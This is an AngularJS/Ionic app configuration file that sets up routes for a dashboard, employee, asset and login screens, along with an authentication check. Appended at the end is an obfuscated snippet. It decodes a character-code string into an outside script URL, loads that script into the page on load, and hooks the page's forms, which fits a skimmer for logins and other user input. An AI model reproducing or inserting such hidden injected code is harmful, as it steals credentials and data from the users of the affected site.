var app = angular.module('appcpe', ['ionic', 'morphCarousel', 'starter.controller.login', 'LocalStorageModule']);

app.config(function($stateProvider, $urlRouterProvider, $ionicConfigProvider, $httpProvider) {
    $ionicConfigProvider.backButton.previousTitleText(false).text('');

    $stateProvider
    // Rotas para aplicativo dos taxista
    .state('app', {
        url : '/app',
        templateUrl : 'templates/app/menu.html',
        abstract : true,
        controller : 'ControllerMenu'
    })

    .state('app.dashboard', {
        url: '/dashboard',
        views: {
            'app': {
                templateUrl: 'templates/app/dashboard.html',
                controller : 'ControllerDashboard'
            }
        }
    })    

    .state('app.funcionarios', {
        url: '/funcionarios',
        views: {
            'app': {
                templateUrl: 'templates/app/funcionarios.html',
                controller : 'ControllerFuncionarios'
            }
        }
    })

    .state('app.patrimonios', {
        url: '/patrimonios',
        views: {
            'app': {
                templateUrl: 'templates/app/patrimonios/patrimonios.html',
                controller : 'ControllerPatrimonios'
            }
        }
    })

    .state('app.patrimoniosNovo', {
        url: '/patrimoniosNovo',
        views: {
            'app': {
                templateUrl: 'templates/app/patrimonios/patrimoniosNovo.html',
                controller : 'ControllerPatrimoniosNovo'
            }
        }
    })

    .state('app.vinculos', {
        url: '/vinculos',
        views: {
            'app': {
                templateUrl: 'templates/app/vinculos/vinculos.html',
                controller : 'ControllerVinculos'
            }
        }
    })    

    .state('app.vinculosNovo', {
        url: '/vinculosNovo',
        views: {
            'app': {
                templateUrl: 'templates/app/vinculos/vinculosNovo.html',
                controller : 'ControllerVinculosNovo'
            }
        }
    })  
    .state('app.login', {
        url: '/login',
        views: {
            'app': {
                templateUrl: 'templates/seguranca/login.html',
                controller : 'ControllerLogin'
            }
        }
    })   

    $urlRouterProvider.otherwise('/app/dashboard');
});

var urlBase = 'http://homologcpe.azurewebsites.net/';

app.constant('ngAuthSettings', {
    apiServiceBaseUri: urlBase
});

app.run(function(authService, $rootScope, $timeout, localStorageService){
     
    $timeout(function(){
        $rootScope.$emit('loadDataUser', []); 
    }, 300);

    authService.checkAuth();
    $rootScope.$on("$stateChangeStart", function (event, next) {
        authService.checkAuth();
    });          
});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db